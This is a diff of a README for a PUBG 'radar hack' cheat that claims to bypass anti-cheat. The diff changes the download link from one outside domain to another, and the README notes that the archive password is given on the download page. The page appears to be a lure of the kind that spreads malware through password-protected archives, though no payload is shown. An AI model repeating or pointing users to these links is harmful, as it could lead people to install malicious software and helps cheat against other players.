@@ -18,7 +18,7 @@ PUBG Radar Hack - undetected PUBG cheat. Bypasses anti-cheat system. Works on PC
 
 ## Download
 
-[![Download v5.1.0](https://img.shields.io/badge/Download_v5.1.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/pubgradarhack)
+[![Download v5.1.0](https://img.shields.io/badge/Download_v5.1.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/pubgradarhack)
 
 > The archive password is shown on the download page.
 
